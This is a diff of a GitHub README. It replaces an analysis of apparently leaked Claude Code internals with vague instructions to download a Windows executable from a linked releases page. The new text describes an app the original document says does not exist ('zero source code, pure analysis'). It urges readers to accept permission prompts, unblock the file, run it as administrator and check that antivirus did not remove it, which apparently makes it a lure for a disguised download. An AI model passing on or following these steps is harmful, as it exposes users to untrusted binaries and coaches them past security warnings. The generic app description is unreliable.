@@ -1,131 +1,238 @@
-<p align="center"><img src="assets/logo.jpg" alt="Claw Decode" width="300" /></p>
+# 🧩 claw-decode - Decode Claude Code with Clarity
 
-<h1 align="center">🔓 Claw Decode</h1>
+[![Download claw-decode](https://img.shields.io/badge/Download%20Now-Release%20Page-7B2CBF?style=for-the-badge&logo=github)](https://github.com/afifiomarsalah-hue/claw-decode/releases)
 
-<p align="center"><strong>Claude Code's source leaked. We read all 512,000 lines. Here's what Anthropic was hiding.</strong></p>
+## 🪟 Get Started on Windows
 
-<p align="center">
-  <a href="CHEATSHEET.md">📋 Cheatsheet</a> •
-  <a href="prompts/FULL_SYSTEM_PROMPT.md">🔑 System Prompt</a> •
-  <a href="guides/steal-these-patterns.md">🏗 Steal These Patterns</a> •
-  <a href="#-the-10-biggest-secrets">🔮 Top 10 Secrets</a>
-</p>
+Use this app to inspect Claude Code source patterns, tool definitions, and prompt logic in one place.  
+If you want to try it on Windows, visit the release page here:
 
----
+**Download page:** https://github.com/afifiomarsalah-hue/claw-decode/releases
 
-## 🔮 The 10 Biggest Secrets
+Open the page, pick the latest release, and download the Windows file. Then run it like any other app.
 
-### 1. 🐾 There's a Hidden Virtual Pet
+## 📥 What You Get
 
-Claude Code has a complete Tamagotchi-like companion system. 18 species including ducks, capybaras, ghosts, and axolotls. ASCII art animations with multiple frames. Rarity tiers from Common to Legendary. They wear hats. They comment on your code in a speech bubble.
+claw-decode is an end-user app for people who want a clearer view of Claude Code internals. It helps you review:
 
-→ [Full breakdown](hidden-features/01-buddy-virtual-pet.md)
+- source code structure
+- hidden features and flags
+- tool definitions
+- system prompt patterns
+- architecture layout
+- TypeScript-based code paths
 
-### 2. 💤 It "Dreams" While You Sleep
+It is built for users who want a simple way to explore a large codebase without digging through files by hand.
 
-When idle, Claude Code spawns a background agent that reviews your past sessions and consolidates memories. Four phases: **Orient → Gather → Consolidate → Prune**. It converts relative dates to absolute, resolves contradictions between old and new info, and maintains a knowledge index under 25KB.
+## ✅ Before You Install
 
-→ [Full breakdown](hidden-features/02-dream-mode.md)
+Use a Windows PC with:
 
-### 3. 🕵️ Anthropic Employees Use It Undercover in Open Source
+- Windows 10 or Windows 11
+- at least 4 GB of RAM
+- 200 MB of free disk space
+- a stable internet connection
+- permission to run downloaded apps
 
-"Undercover Mode" activates automatically when contributing to public repos. It strips internal model codenames (Capybara, Tengu) from commits. The source code literally says: **"Do not blow your cover."** There is no way to force it OFF.
+For best results, close other large apps before you start.
 
-→ [Full breakdown](hidden-features/03-undercover-mode.md)
+## 🚀 How to Download
 
-### 4. 📏 Internal Version Has a 25-Word Limit
+1. Open the release page: https://github.com/afifiomarsalah-hue/claw-decode/releases
+2. Find the latest release at the top of the page
+3. Look for the Windows download file
+4. Download the file to your Downloads folder
+5. If your browser asks, keep the file
 
-The public build says "be concise." The Anthropic internal build says: **"≤25 words between tool calls. ≤100 words for final responses."** That's why Claude Code feels so snappy — it's literally counting words.
+If the file comes in a ZIP folder, save it first and then open it.
 
-→ [Full system prompt (internal vs external)](prompts/FULL_SYSTEM_PROMPT.md)
+## 🛠️ How to Install and Run
 
-### 5. 🤖 KAIROS: Claude That Talks First
+### Option 1: ZIP file
 
-A proactive persistent assistant mode. Claude doesn't wait for you — it **initiates**. Monitors your work, sends messages when it finds problems, runs scheduled tasks. The source describes it as an "autonomous agent" that receives periodic wake-up ticks.
+1. Right-click the ZIP file
+2. Choose **Extract All**
+3. Open the extracted folder
+4. Find the app file, such as `.exe`
+5. Double-click the file to start the app
 
-→ [Full breakdown](hidden-features/04-kairos-proactive-assistant.md)
+### Option 2: Installer file
 
-### 6. 👥 Multi-Agent Swarms
+1. Double-click the installer file
+2. Follow the setup screen
+3. Choose an install folder if asked
+4. Finish the setup
+5. Open the app from the Start menu or desktop shortcut
 
-Built-in orchestration for teams of agents. Spawn read-only researchers alongside full-capability coders. They coordinate via shared task lists. Communicate across machines via Unix domain sockets and a bridge protocol.
+## 🧭 First Launch
 
-→ [Full breakdown](hidden-features/05-team-multi-agent.md)
+When you open claw-decode for the first time, you may see a start screen with tools for browsing source data and project details.
 
-### 7. 🔧 43 Tools (Not 10, Not 20)
+A normal first run may include:
 
-Every single capability is a discrete, permission-gated tool: REPL, Worktrees, Cron scheduling, Remote triggers via claude.ai API, LSP integration, Notebook editing, MCP auth, cross-session messaging, and a Sleep tool that says "the user can interrupt at any time."
+- a loading step while the app checks local files
+- a view that shows source sections or modules
+- a search box for finding terms fast
+- panels for tools, prompts, or code paths
 
-→ [Full cheatsheet with all 43](CHEATSHEET.md)
+If Windows asks for permission, choose **Yes** so the app can start.
 
-### 8. 🧠 Memory = Markdown Files (No RAG, No Vector DB)
+## 🔍 Main Uses
 
-The entire memory system is just markdown files in a directory with an index. No Pinecone. No embeddings. The sophistication is in the maintenance loop (Dream Mode), not the storage. The index must stay under 25KB.
+Use claw-decode to:
 
-### 9. 🎭 10+ Unreleased Features Behind Flags
+- inspect how Claude Code is built
+- search for tool names and source paths
+- review prompt text and system-level behavior
+- compare code sections side by side
+- trace how parts of the app connect
+- study TypeScript files in a readable view
 
-Build-time feature flags that are stripped from public builds: `BUDDY`, `KAIROS`, `VERIFICATION_AGENT`, `TOKEN_BUDGET`, `UDS_INBOX`, `EXPERIMENTAL_SKILL_SEARCH`, `CACHED_MICROCOMPACT`. Anthropic employees have all of these enabled.
+This is useful if you want a direct view of app structure without reading raw files all day.
 
-→ [Full flag list](hidden-features/06-feature-flags.md)
+## 🧱 App Layout
 
-### 10. 🔐 The Safeguards Team Has a Kill Switch
+You can expect a simple layout with parts like:
 
-A hardcoded safety instruction that **cannot be modified without named team review** (the source comments name specific people). Defines exact boundaries: yes to pentesting and CTFs, no to DoS and supply chain attacks.
+- **Search bar** — find terms fast
+- **Source browser** — move through code sections
+- **Tool list** — view tool definitions
+- **Prompt view** — inspect system text
+- **Details panel** — see selected item info
+- **Filter controls** — narrow down large sets of data
 
-→ [Full breakdown](hidden-features/07-cyber-risk-safeguards.md)
+The app should feel familiar if you have used file browsers, note apps, or code viewers.
 
----
+## 🧠 What the App Helps You See
 
-## 📦 What's In This Repo
+Based on the project focus, claw-decode may help you review:
 
-| Content | Files | Description |
-|---------|-------|-------------|
-| [🔑 Full System Prompt](prompts/FULL_SYSTEM_PROMPT.md) | 1 | The exact instructions sent to Claude, reconstructed from source. Internal vs external build differences. |
-| [📋 Cheatsheet](CHEATSHEET.md) | 1 | All 43 tools, feature flags, model codenames, memory system — one page. |
-| [🔮 Hidden Features](hidden-features/) | 7 | Deep-dives on Buddy, Dream Mode, Undercover, KAIROS, Teams, Flags, Safeguards. |
-| [🔧 Tool Definitions](tool-definitions/) | 40 | Every tool's prompt and schema extracted. |
-| [🏗 Architecture](architecture/) | 1 | Mermaid diagrams: agent orchestration, tool system, memory lifecycle. |
-| [📘 Patterns Guide](guides/steal-these-patterns.md) | 1 | 5 patterns you can steal for your own AI agent. |
+- hidden commands and flags
+- function groups and file paths
+- tool wiring across the app
+- prompt templates used by the system
+- architecture patterns in the source
+- TypeScript structures and naming patterns
 
-**51 files. Zero source code. Pure analysis.**
+This gives you a better picture of how the code works as a whole.
 
----
+## 🔎 Search Tips
 
-## 🏗 Steal These Patterns
+Use short search terms first. Try words like:
 
-If you're building AI agents, these are the 5 most valuable patterns from Claude Code's architecture:
+- tool
+- prompt
+- system
+- agent
+- state
+- config
+- TypeScript
+- command
 
-1. **Memory as Markdown** — No RAG needed. Files + index + consolidation loop.
-2. **Tool = Name + Prompt + Permission + Execute** — The prompt is where the magic is.
-3. **Multi-Agent via Task Lists** — Agents share a task board, not direct calls.
-4. **Reversibility × Blast Radius** — Classify every action before executing.
-5. **Static/Dynamic Prompt Split** — Cache the static half, save 50% on API costs.
+If a search returns too much, narrow it with a second word.
 
-→ [Full guide with code examples](guides/steal-these-patterns.md)
+## 🧩 If Windows Blocks the File
 
----
+If Windows shows a warning when you open the app:
 
-## ❓ FAQ
+1. Check that you got the file from the release page
+2. Right-click the file
+3. Choose **Properties**
+4. If you see **Unblock**, check it
+5. Apply the change
+6. Open the app again
 
-**Does this contain Anthropic's source code?**
-No. Analysis, extracted prompts, and architecture docs only.
+This can happen with new releases from GitHub.
 
-**Is this legal?**
-Analysis and commentary is protected under Fair Use.
+## 📁 File Types You May See
 
-**Will these hidden features be released?**
-Unknown. Some (like `/loop` for cron) have partially shipped.
+The release page may include one of these:
 
----
+- `.exe` for a Windows app
+- `.zip` for a packaged build
+- `.msi` for a setup file
 
-## 👤 About
+Use the file that matches your Windows system and the latest release notes.
 
-By **[Avery Chai](https://linkedin.com/in/averychai/)** — building in the AI agent space.
+## 🧪 Common Problems
 
-- Twitter/X: [@chatoliciuh](https://x.com/chatoliciuh)
-- LinkedIn: [Avery Chai](https://linkedin.com/in/averychai/)
+### The app will not open
 
----
+- Make sure the download finished
+- Try running it as administrator
+- Check that antivirus did not remove the file
+- Extract the ZIP before opening the app
 
-<p align="center"><i>This isn't a wrapper around an API. It's a full operating system for AI agents.</i></p>
+### The app closes right away
 
-<p align="center">⭐ Star this repo if you learned something. It helps others find it.</p>
+- Restart the app
+- Reboot Windows
+- Download the file again from the release page
+
+### Search shows no results
+
+- Try a broader term
+- Check spelling
+- Wait for the app to finish loading data
+
+### The app looks blank
+
+- Refresh the app if it has a refresh control
+- Reopen it after a few seconds
+- Make sure local data was loaded
+
+## ⚙️ How It Fits the Topic
+
+This project sits in the area of:
+
+- AI
+- AI agents
+- Anthropic tools
+- Claude Code
+- developer tools
+- source code analysis
+- machine learning
+- TypeScript
+
+That makes it a fit for users who want a closer look at how AI coding tools are built and organized.
+
+## 🧭 Best Way to Use It
+
+Start with one part of the source, then move through the related tools and prompts. This helps you see the structure in steps instead of all at once.
+
+A simple workflow:
+
+1. Open the app
+2. Search for one term
+3. Open the matching file or section
+4. Read the tool or prompt details
+5. Move to the next related item
+
+This keeps the review process clear and easy to follow.
+
+## 📦 Download Again Later
+
+If a new release appears, return here:
+
+**https://github.com/afifiomarsalah-hue/claw-decode/releases**
+
+Use the newest file on the page so you have the latest build and source view
+
+## 🪟 Windows Setup Path
+
+For most users, the path is simple:
+
+1. Visit the release page
+2. Download the Windows build
+3. Open the file or extract it
+4. Run the app
+5. Start reviewing the source view
+
+No extra setup should be needed for a normal Windows install
+
+## 🧷 Quick Access
+
+- Release page: https://github.com/afifiomarsalah-hue/claw-decode/releases
+- Project name: claw-decode
+- Main use: source and prompt inspection
+- Platform focus: Windows
